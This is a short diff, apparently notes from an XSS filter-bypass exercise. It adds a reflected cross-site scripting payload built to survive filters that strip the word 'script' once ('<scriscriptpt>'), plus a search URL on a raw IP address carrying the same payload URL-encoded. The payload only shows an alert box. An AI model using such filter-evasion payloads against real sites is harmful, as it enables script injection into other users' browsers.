@@ -1,0 +1,3 @@
+<scriscriptpt> alert("xss") </scscriptript>
+
+url: http://3.86.24.15/search?q=%3Cscriscriptpt%3E+alert%28%22xss%22%29+%3C%2Fscscriptript%3E
